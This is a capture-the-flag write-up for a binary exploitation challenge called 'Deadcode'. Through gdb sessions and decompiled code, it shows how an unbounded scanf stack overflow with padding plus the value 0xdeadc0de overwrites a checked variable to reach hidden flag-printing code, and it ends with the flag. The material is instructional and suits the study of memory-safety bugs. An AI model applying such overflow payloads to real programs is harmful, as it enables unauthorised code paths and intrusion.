# Deadcode
300
Binary Exploitation
8 solves when it was solved by me

# Description
Hmm... that's odd. The binary seems to have code that prints the flag, but it never seems to execute. Can we do something about it?

Interact with the service at: challenges.csdc20t.ctf.sg:10013

Hint: Is there a limit on how much data is being read?

# Attached Files
deadcode

# Experimentation
ltrace, strings, and strace seems to not give anything other than some basic information
1. This function uses `puts` and `scanf`
    - Researching on `scanf` gets you [this](https://stackoverflow.com/questions/35734927/vulnerability-using-printf-scanf-and-s), which says that **scanf does not set any bounds on what it takes in as input** so you can **overflow the buffer**?

	
Let's try decompiling (because I'm illiterate) in radare2
```
       ; var unsigned int local_8h @ ebp-0x8
```
```
       dword [local_8h] = 0xffffffff //-1 ; -8
```
```
       int printf(const char * format : (*0xf34)0x00177f70 = Bring my deadcode back to life =>)
       esp += 4
       eax = dword [ebx + 0x38] //[0x38:4]=52 ; '8'
       eax = dword [eax]
       push eax                 //FILE *stream
                                                   
       int fflush(FILE * : unk_format)
       esp += 4
       eax = dword [local_88h]
       push eax
       eax = dword [ebx - 0x2065] //"%s"
       push eax                 //const char *format ; (pstr 0x00000f57) "%s"
                                                           
       int scanf(const char * format : (*0xf57)0x00177f6c = %s)

       esp += 8
       var = dword [local_8h] - 0xdeadc0de
       if (var) goto 0x7b4      //likely
       {
        loc_0x7b4:

           //CODE XREF from main (0x78b)
           eax = dword [ebx - 0x204f]
           push eax                 //const char *s
                                                     
           int puts(const char * s : (*0xffffdfb1)0x00177ffc = .................................)
           esp += 4                 //ebp
           eax = dword [ebx + 0x38] //[0x38:4]=52 ; '8' ; segment.PHDR
           eax = dword [eax]
           push eax                 //FILE *stream
                                                       
           int fflush(FILE * : unk_format)
           esp += 4                 //ebp
           eax = 0
       do
       {

```
1. `FILE *stream`?. A file is being opened? So yeah, we probably have to run on the server
2. An if statement? We could probably overflow and overwrite some variable or stuff i think
3. 0xdeadc0de? var = dword [local_8h] - 0xdeadc0de? var unsigned int local_8h @ ebp-0x8? So if we modify ebp-0x8, will it work?
4. Input variable in ebx - 0x2065?

Let's run it normally
```
$ ./deadcode 
████████▄     ▄████████    ▄████████ ████████▄   ▄████████  ▄██████▄  ████████▄     ▄████████ 
███   ▀███   ███    ███   ███    ███ ███   ▀███ ███    ███ ███    ███ ███   ▀███   ███    ███ 
███    ███   ███    █▀    ███    ███ ███    ███ ███    █▀  ███    ███ ███    ███   ███    █▀  
███    ███  ▄███▄▄▄       ███    ███ ███    ███ ███        ███    ███ ███    ███  ▄███▄▄▄     
███    ███ ▀▀███▀▀▀     ▀███████████ ███    ███ ███        ███    ███ ███    ███ ▀▀███▀▀▀     
███    ███   ███    █▄    ███    ███ ███    ███ ███    █▄  ███    ███ ███    ███   ███    █▄  
███   ▄███   ███    ███   ███    ███ ███   ▄███ ███    ███ ███    ███ ███   ▄███   ███    ███ 
████████▀    ██████████   ███    █▀  ████████▀  ████████▀   ▀██████▀  ████████▀    ██████████ 
                                                                                              
Bring my deadcode back to life => AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
LOLNO. KTHXBAI. XD.
$ ./deadcode 
████████▄     ▄████████    ▄████████ ████████▄   ▄████████  ▄██████▄  ████████▄     ▄████████ 
███   ▀███   ███    ███   ███    ███ ███   ▀███ ███    ███ ███    ███ ███   ▀███   ███    ███ 
███    ███   ███    █▀    ███    ███ ███    ███ ███    █▀  ███    ███ ███    ███   ███    █▀  
███    ███  ▄███▄▄▄       ███    ███ ███    ███ ███        ███    ███ ███    ███  ▄███▄▄▄     
███    ███ ▀▀███▀▀▀     ▀███████████ ███    ███ ███        ███    ███ ███    ███ ▀▀███▀▀▀     
███    ███   ███    █▄    ███    ███ ███    ███ ███    █▄  ███    ███ ███    ███   ███    █▄  
███   ▄███   ███    ███   ███    ███ ███   ▄███ ███    ███ ███    ███ ███   ▄███   ███    ███ 
████████▀    ██████████   ███    █▀  ████████▀  ████████▀   ▀██████▀  ████████▀    ██████████ 
                                                                                              
Bring my deadcode back to life => AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
LOLNO. KTHXBAI. XD.
Segmentation fault (core dumped)
```
Interesting, a segmentation fault. Probably means we overwritten something I think. (Actually means access illegal memory location but yeah same concept)


Allright, gdb time

Some breakpoints to set
1. `break *0x56555781` after scanf

```                        
Bring my deadcode back to life => 
Breakpoint 1, 0x5655577b in main ()
(gdb) 
(gdb) 
(gdb) ni
0x5655577c in main ()
(gdb) 
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
0x56555781 in main ()
(gdb) ni
0x56555784 in main ()
(gdb) x/24xw $ebp
0xffffcde8:	0x49494949	0x4a4a4a4a	0x4b4b4b4b	0x4c4c4c4c
0xffffcdf8:	0x4d4d4d4d	0x4e4e4e4e	0x4f4f4f4f	0x50505050
0xffffce08:	0x51515151	0x52525252	0x53535353	0x54545454
0xffffce18:	0x55555555	0x56565656	0x57575757	0x58585858
0xffffce28:	0x59595959	0x5a5a5a5a	0x00000000	0x00000000
0xffffce38:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) x/24xw $esp
0xffffcd60:	0x41414141	0x42424242	0x43434343	0x44444444
0xffffcd70:	0x45454545	0x46464646	0x47474747	0x48484848
0xffffcd80:	0x49494949	0x4a4a4a4a	0x4b4b4b4b	0x4c4c4c4c
0xffffcd90:	0x4d4d4d4d	0x4e4e4e4e	0x4f4f4f4f	0x50505050
0xffffcda0:	0x51515151	0x52525252	0x53535353	0x54545454
0xffffcdb0:	0x55555555	0x56565656	0x57575757	0x58585858
(gdb) ni
0x5655578b in main ()
(gdb) x/24xw $ebp-0x8
0xffffcde0:	0x47474747	0x48484848	0x49494949	0x4a4a4a4a
0xffffcdf0:	0x4b4b4b4b	0x4c4c4c4c	0x4d4d4d4d	0x4e4e4e4e
0xffffce00:	0x4f4f4f4f	0x50505050	0x51515151	0x52525252
0xffffce10:	0x53535353	0x54545454	0x55555555	0x56565656
0xffffce20:	0x57575757	0x58585858	0x59595959	0x5a5a5a5a
0xffffce30:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) print $ebp-0x8
$1 = (void *) 0xffffcde0
```
So it SIGSEGV's when the alphabet is put in twice? And by hex, the pointer being checked is at the letter G?

```
████████▄     ▄████████    ▄████████ ████████▄   ▄████████  ▄██████▄  ████████▄     ▄████████ 
███   ▀███   ███    ███   ███    ███ ███   ▀███ ███    ███ ███    ███ ███   ▀███   ███    ███ 
███    ███   ███    █▀    ███    ███ ███    ███ ███    █▀  ███    ███ ███    ███   ███    █▀  
███    ███  ▄███▄▄▄       ███    ███ ███    ███ ███        ███    ███ ███    ███  ▄███▄▄▄     
███    ███ ▀▀███▀▀▀     ▀███████████ ███    ███ ███        ███    ███ ███    ███ ▀▀███▀▀▀     
███    ███   ███    █▄    ███    ███ ███    ███ ███    █▄  ███    ███ ███    ███   ███    █▄  
███   ▄███   ███    ███   ███    ███ ███   ▄███ ███    ███ ███    ███ ███   ▄███   ███    ███ 
████████▀    ██████████   ███    █▀  ████████▀  ████████▀   ▀██████▀  ████████▀    ██████████ 
                                                                                              
Bring my deadcode back to life => 
Breakpoint 1, 0x5655577b in main ()
(gdb) ni
0x5655577c in main ()
(gdb) ni
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFFGGGG
0x56555781 in main ()
(gdb) c
Continuing.
LOLNO. KTHXBAI. XD.
[Inferior 1 (process 23708) exited normally]
(gdb) 
```
Oh it runs normally now. idk what i'm doing to let's try to inject the payload

```
Bring my deadcode back to life => 
Breakpoint 1, 0x5655577b in main ()
(gdb) ni
0x5655577c in main ()
(gdb) ni
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFF\xde\xc0\xad\xde
0x56555781 in main ()
(gdb) c
Continuing.
LOLNO. KTHXBAI. XD.

Program received signal SIGSEGV, Segmentation fault.
0x6564785c in ?? ()
(gdb) 
```

## Actually we should prove that we need to modify the correct register right?
```
Bring my deadcode back to life => 
Breakpoint 1, 0x56555781 in main ()
(gdb) set {int}0xffffcde0=0xdeadc0de
(gdb) c'
Unmatched single quote.
(gdb) c
Continuing.
[Detaching after vfork from child process 24550]

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```
Proven, because it doesn't print the normal message (should be SIGSEGV because no flag file exists)

By the way through more experimentation, the input starts from $esp+8, and our goal is to get it to $ebp-0x8
```
(gdb) x/4xw $esp+8
0xffffcd60:	0x41414141	0x41414141	0x41414141	0x41414141
(gdb) x/4xw $esp
0xffffcd58:	0x56555f57	0xffffcd60	0x41414141	0x41414141
```

## Trying to modify the register
After tons of trial and error I got thepadding right
```
Bring my deadcode back to life => 
Breakpoint 1, 0x56555781 in main ()
(gdb) x/36xw $esp+8
0xffffcd60:	0x41414141	0x42424242	0x43434343	0x44444444
0xffffcd70:	0x45454545	0x46464646	0x47474747	0x48484848
0xffffcd80:	0x49494949	0x4a4a4a4a	0x4b4b4b4b	0x4c4c4c4c
0xffffcd90:	0x4d4d4d4d	0x4e4e4e4e	0x4f4f4f4f	0x50505050
0xffffcda0:	0x51515151	0x52525252	0x53535353	0x54545454
0xffffcdb0:	0x55555555	0x56565656	0x57575757	0x58585858
0xffffcdc0:	0x59595959	0x5a5a5a5a	0x41414141	0x42424242
0xffffcdd0:	0x43434343	0x44444444	0x45454545	0x46464646
0xffffcde0:	0xffffff00	0x00000000	0x00000000	0xf7de5751
(gdb) 
```

But just with using `\xde\xc0\xad\xde', the byte isn't overwritten correctly
```
Breakpoint 1, 0x56555781 in main ()
(gdb) x/36xw $esp+8
0xffffcd60:	0x41414141	0x42424242	0x43434343	0x44444444
0xffffcd70:	0x45454545	0x46464646	0x47474747	0x48484848
0xffffcd80:	0x49494949	0x4a4a4a4a	0x4b4b4b4b	0x4c4c4c4c
0xffffcd90:	0x4d4d4d4d	0x4e4e4e4e	0x4f4f4f4f	0x50505050
0xffffcda0:	0x51515151	0x52525252	0x53535353	0x54545454
0xffffcdb0:	0x55555555	0x56565656	0x57575757	0x58585858
0xffffcdc0:	0x59595959	0x5a5a5a5a	0x41414141	0x42424242
0xffffcdd0:	0x43434343	0x44444444	0x45454545	0x46464646
0xffffcde0:	0x80c39ec3	0x9ec3adc2	0x00000000	0xf7de5751
(gdb)
```

And then I realised I was using python3 to generate `payload.in`
```
Bring my deadcode back to life => 
Breakpoint 1, 0x56555781 in main ()
(gdb) x/36xw $esp+8
0xffffcd60:	0x41414141	0x42424242	0x43434343	0x44444444
0xffffcd70:	0x45454545	0x46464646	0x47474747	0x48484848
0xffffcd80:	0x49494949	0x4a4a4a4a	0x4b4b4b4b	0x4c4c4c4c
0xffffcd90:	0x4d4d4d4d	0x4e4e4e4e	0x4f4f4f4f	0x50505050
0xffffcda0:	0x51515151	0x52525252	0x53535353	0x54545454
0xffffcdb0:	0x55555555	0x56565656	0x57575757	0x58585858
0xffffcdc0:	0x59595959	0x5a5a5a5a	0x41414141	0x42424242
0xffffcdd0:	0x43434343	0x44444444	0x45454545	0x46464646
0xffffcde0:	0xdeadc0de	0x00000000	0x00000000	0xf7de5751
(gdb) c
Continuing.
[Detaching after vfork from child process 27308]
cat: /home/hacker/flag.txt: No such file or directory
[Inferior 1 (process 27291) exited normally]
(gdb) 

```
The above one uses python2. My guess is that python3 stores the characters as unicode instead of ascii, causing it to take more space than needed. Yes this is very nice

# Netcat time!
Just make some python code to netcat.
* For some reason, Now python3 works? idk, file output?

# Flag
`CTFSG{c0d3_n3cr0m4cy}`
